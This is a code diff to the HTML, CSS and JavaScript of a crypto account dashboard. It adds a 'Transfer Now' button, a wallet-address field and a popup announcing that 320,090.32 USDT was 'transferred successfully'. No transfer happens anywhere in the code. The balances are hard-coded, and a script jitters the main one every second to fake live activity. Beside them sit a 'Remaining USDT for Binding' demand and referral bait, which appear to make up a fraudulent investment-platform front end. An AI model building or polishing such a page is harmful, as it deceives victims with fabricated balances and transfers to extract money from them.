@@ -69,15 +69,12 @@
       border-radius: 20px;
       padding: 22px;
       border: 2px solid rgba(100, 181, 246, 0.4);
-      box-shadow: 
-        0 15px 40px rgba(0, 30, 80, 0.6),
-        0 0 30px rgba(100, 181, 246, 0.3);
+      box-shadow: 0 15px 40px rgba(0, 30, 80, 0.6), 0 0 30px rgba(100, 181, 246, 0.3);
       transition: all 0.4s ease;
     }
     .glass-card:hover {
       transform: translateY(-5px);
       border-color: rgba(100, 181, 246, 0.6);
-      box-shadow: 0 20px 50px rgba(30, 136, 229, 0.5);
     }
 
     .header h1 {
@@ -110,7 +107,6 @@
       0% { transform: translateX(0); }
       100% { transform: translateX(-100%); }
     }
-    .price { margin: 0 22px; font-weight: 600; }
 
     .current-amount { text-align: center; }
     .main-amount {
@@ -136,6 +132,57 @@
     .transfer-stage i { animation: spin 1.5s linear infinite; }
     @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
 
+    /* TRANSFER NOW BUTTON */
+    .transfer-btn {
+      margin-top: 12px;
+      padding: 12px 24px;
+      background: linear-gradient(135deg, #10b981, #34d399);
+      color: white;
+      border: none;
+      border-radius: 30px;
+      font-weight: 700;
+      font-size: 14px;
+      cursor: pointer;
+      width: fit-content;
+      margin-left: auto;
+      margin-right: auto;
+      box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4);
+      transition: 0.3s;
+    }
+    .transfer-btn:hover {
+      background: linear-gradient(135deg, #059669, #10b981);
+      transform: translateY(-2px);
+    }
+
+    /* DROPDOWN */
+    .dropdown {
+      margin-top: 10px;
+      padding: 16px;
+      background: rgba(255, 255, 255, 0.08);
+      border-radius: 14px;
+      border: 1px solid rgba(100, 181, 246, 0.4);
+      display: none;
+    }
+    .dropdown input {
+      width: 100%;
+      padding: 12px;
+      background: rgba(255, 255, 255, 0.1);
+      border: 1px solid rgba(100, 181, 246, 0.5);
+      color: white;
+      border-radius: 10px;
+      font-size: 14px;
+      margin-bottom: 10px;
+    }
+    .dropdown button {
+      background: linear-gradient(135deg, #3b82f6, #1d4ed8);
+      padding: 10px 20px;
+      border: none;
+      border-radius: 10px;
+      color: white;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
     .stats {
       display: grid;
       grid-template-columns: 1fr 1fr;
@@ -149,20 +196,9 @@
       border-radius: 14px;
       border: 1px solid rgba(100, 181, 246, 0.3);
     }
-    .stat-box h3 {
-      font-size: 13px;
-      color: #90caf9;
-      margin-bottom: 6px;
-      font-weight: 500;
-    }
-    .stat-box p {
-      font-size: 20px;
-      font-family: 'Cinzel', serif;
-      font-weight: 700;
-      color: #fff;
-    }
+    .stat-box h3 { font-size: 13px; color: #90caf9; margin-bottom: 6px; }
+    .stat-box p { font-size: 20px; font-family: 'Cinzel', serif; font-weight: 700; color: #fff; }
 
-    /* BINDING REQUEST - RED */
     .binding-alert {
       position: absolute;
       top: -12px;
@@ -174,16 +210,20 @@
       border-radius: 30px;
       font-size: 12px;
       font-weight: 700;
-      letter-spacing: 0.5px;
       box-shadow: 0 4px 15px rgba(220, 38, 38, 0.5);
       white-space: nowrap;
       z-index: 10;
       animation: pulse-red 2s infinite;
     }
-    @keyframes pulse-red {
-      0%, 100% { transform: translateX(-50%) scale(1); }
-      50% { transform: translateX(-50%) scale(1.05); }
+    @keyframes pulse-red { 0%, 100% { transform: translateX(-50%) scale(1); } 50% { transform: translateX(-50%) scale(1.05); } }
+
+    .binding-info {
+      text-align: center;
+      margin-top: 12px;
+      color: #90caf9;
+      font-size: 13px;
     }
+    .binding-info span { color: #64b5f6; font-weight: 700; }
 
     .updates { display: grid; gap: 14px; }
     .update-item {
@@ -191,11 +231,6 @@
       background: rgba(255, 255, 255, 0.07);
       border-left: 4px solid #42a5f5;
       border-radius: 0 12px 12px 0;
-      transition: 0.3s;
-    }
-    .update-item:hover {
-      background: rgba(255, 255, 255, 0.12);
-      border-left-color: #64b5f6;
     }
     .update-item h4 { color: #64b5f6; font-size: 15px; margin-bottom: 6px; font-weight: 600; }
     .update-item p { font-size: 13px; color: #bbdefb; line-height: 1.5; }
@@ -212,16 +247,58 @@
       font-size: 13px;
     }
     .footer-links a { color: #90caf9; text-decoration: none; font-weight: 500; }
-    .footer-links a:hover { color: #64b5f6; text-shadow: 0 0 10px rgba(100, 181, 246, 0.6); }
+    .footer-links a:hover { color: #64b5f6; }
+
+    /* POPUP */
+    .popup {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.9);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 99999;
+      opacity: 0;
+      visibility: hidden;
+      transition: 0.4s;
+    }
+    .popup.show { opacity: 1; visibility: visible; }
+    .popup-content {
+      background: rgba(10, 25, 50, 0.9);
+      backdrop-filter: blur(20px);
+      padding: 40px;
+      border-radius: 24px;
+      text-align: center;
+      border: 2px solid #10b981;
+      box-shadow: 0 0 50px rgba(16, 185, 129, 0.6);
+      transform: scale(0.8);
+      transition: 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+    .popup.show .popup-content { transform: scale(1); }
+    .popup h2 {
+      font-family: 'Cinzel', serif;
+      font-size: 28px;
+      color: #10b981;
+      margin-bottom: 12px;
+    }
+    .popup p {
+      font-size: 16px;
+      color: #bbf7d0;
+      margin-bottom: 20px;
+    }
+    .popup .emoji {
+      font-size: 60px;
+      margin-bottom: 16px;
+    }
 
     @media (max-width: 768px) {
       .container { grid-template-columns: 1fr; }
       .left { display: none; }
-      .right { padding: 18px; gap: 16px; }
+      .right { padding: 18px; }
       .main-amount { font-size: 32px; }
       .stats { grid-template-columns: 1fr; }
-      .binding-alert { font-size: 11px; padding: 5px 12px; top: -10px; }
-      .footer-links { flex-direction: column; gap: 12px; text-align: center; }
+      .binding-alert { top: -10px; font-size: 11px; }
+      .popup-content { padding: 30px; }
     }
   </style>
 </head>
@@ -234,7 +311,7 @@
       <a href="index.html" class="logout" onclick="localStorage.removeItem('loggedIn'); return true;">Logout</a>
 
       <div class="glass-card ticker">
-        <div class="ticker-inner" id="crypto-ticker">
+        <div class="ticker-inner">
           BTC $71,200 Up 2.1% • ETH $3,450 Down 0.8% • BNB $620 Up 1.5% • SOL $180 Up 3.2% • XRP $0.62 Down 1.1% • 
           BTC $71,200 Up 2.1% • ETH $3,450 Down 0.8% • BNB $620 Up 1.5% • SOL $180 Up 3.2% • XRP $0.62 Down 1.1% • 
         </div>
@@ -245,11 +322,18 @@
         <p style="text-align:center;font-size:14px;color:#90caf9;font-weight:500;">Account Dashboard • Reserves Wise</p>
       </div>
 
-      <!-- MAIN BALANCE -->
+      <!-- MAIN BALANCE + TRANSFER NOW -->
       <div class="glass-card current-amount">
         <div class="main-amount" id="mainBalance">320,090.32 USDT</div>
         <div class="ready-transfer" id="readyTransfer">Ready to Transfer: 320,090.32 USDT</div>
-        <div class="transfer-stage"><i>⟳</i> Transfer Stage: Processing</div>
+        <div class="transfer-stage"><span>Transfer Stage: Processing</span></div>
+        <button class="transfer-btn" onclick="toggleDropdown()">Transfer Now</button>
+
+        <!-- DROPDOWN -->
+        <div class="dropdown" id="transferDropdown">
+          <input type="text" placeholder="Enter Wallet Address (TRC20)" id="walletInput" />
+          <button onclick="proceedTransfer()">Proceed</button>
+        </div>
       </div>
 
       <!-- STATS WITH BINDING -->
@@ -258,23 +342,23 @@
         <div class="stats">
           <div class="stat-box">
             <h3>RECEIVED AMOUNT</h3>
-            <p id="receivedAmount">872,090.50 USDT</p>
+            <p>872,090.50 USDT</p>
           </div>
           <div class="stat-box">
             <h3>PENDING AMOUNT</h3>
-            <p id="pendingAmount">372,950.50 USDT</p>
+            <p>372,950.50 USDT</p>
           </div>
         </div>
-        <div style="text-align:center;margin-top:12px;color:#90caf9;font-size:13px;">
-          <strong>Remaining USDT for Binding:</strong> <span id="bindingAmount" style="color:#64b5f6;font-weight:700;">1,245,041.00 USDT</span>
+        <div class="binding-info">
+          <strong>Remaining USDT for Binding:</strong> <span>1,245,041.00 USDT</span>
         </div>
       </div>
 
       <div class="glass-card updates">
-        <div class="update-item"><h4>Platform Update</h4><p>Quantum encryption layer deployed across all nodes.</p></div>
-        <div class="update-item"><h4>Market Alert</h4><p>USDT peg stable at 1.0001. High volume detected.</p></div>
-        <div class="update-item"><h4>System Sync</h4><p>Binding engine restarted. Queue cleared.</p></div>
-        <div class="update-item"><h4>Referral Bonus</h4><p>Invite 3 → Get 500 USDT. Ends in 7 days.</p></div>
+        <div class="update-item"><h4>Platform Update</h4><p>Quantum encryption layer deployed.</p></div>
+        <div class="update-item"><h4>Market Alert</h4><p>USDT peg stable at 1.0001.</p></div>
+        <div class="update-item"><h4>System Sync</h4><p>Binding engine restarted.</p></div>
+        <div class="update-item"><h4>Referral Bonus</h4><p>Invite 3 → Get 500 USDT.</p></div>
       </div>
 
       <div class="footer-links">
@@ -291,38 +375,57 @@
     </div>
   </div>
 
+  <!-- POPUP -->
+  <div class="popup" id="successPopup">
+    <div class="popup-content">
+      <div class="emoji">Checkmark</div>
+      <h2>Complete Binding!</h2>
+      <p>320,090.32 USDT transferred successfully.</p>
+      <button style="background:#10b981;padding:10px 20px;border:none;border-radius:10px;color:white;font-weight:600;cursor:pointer;" onclick="closePopup()">Close</button>
+    </div>
+  </div>
+
   <script>
     if (!localStorage.getItem('loggedIn')) window.location = 'index.html';
 
-    // LIVE USDT FLUCTUATION (Every 1 sec)
+    // LIVE READY TO TRANSFER (ONLY)
     const baseReady = 320090.32;
-    const baseReceived = 872090.50;
-    const basePending = 372950.50;
-    const baseBinding = 1245041.00;
-
     function formatUSDT(num) {
       return num.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ",") + " USDT";
     }
-
-    function fluctuate() {
-      const change = (Math.random() - 0.5) * 200; // ±100 USDT
+    function fluctuateReady() {
+      const change = (Math.random() - 0.5) * 200;
       const newReady = Math.max(300000, baseReady + change);
       document.getElementById('mainBalance').textContent = formatUSDT(newReady);
       document.getElementById('readyTransfer').textContent = "Ready to Transfer: " + formatUSDT(newReady);
+    }
+    setInterval(fluctuateReady, 1000);
+    fluctuateReady();
 
-      // Sync others
-      const received = baseReceived + (change * 0.7);
-      const pending = basePending + (change * 0.3);
-      const binding = baseBinding - change;
-
-      document.getElementById('receivedAmount').textContent = formatUSDT(received);
-      document.getElementById('pendingAmount').textContent = formatUSDT(pending);
-      document.getElementById('bindingAmount').textContent = formatUSDT(binding);
+    // DROPDOWN
+    function toggleDropdown() {
+      const dropdown = document.getElementById('transferDropdown');
+      dropdown.style.display = dropdown.style.display === 'block' ? 'none' : 'block';
     }
 
-    // Start live update
-    setInterval(fluctuate, 1000);
-    fluctuate(); // Initial
+    // PROCEED → POPUP
+    function proceedTransfer() {
+      const wallet = document.getElementById('walletInput').value.trim();
+      if (wallet && wallet.length > 20) {
+        document.getElementById('successPopup').classList.add('show');
+        setTimeout(() => {
+          document.querySelector('.popup-content').style.transform = 'scale(1)';
+        }, 100);
+      } else {
+        alert('Please enter a valid TRC20 wallet address.');
+      }
+    }
+
+    function closePopup() {
+      document.getElementById('successPopup').classList.remove('show');
+      document.getElementById('transferDropdown').style.display = 'none';
+      document.getElementById('walletInput').value = '';
+    }
   </script>
 </body>
 </html>
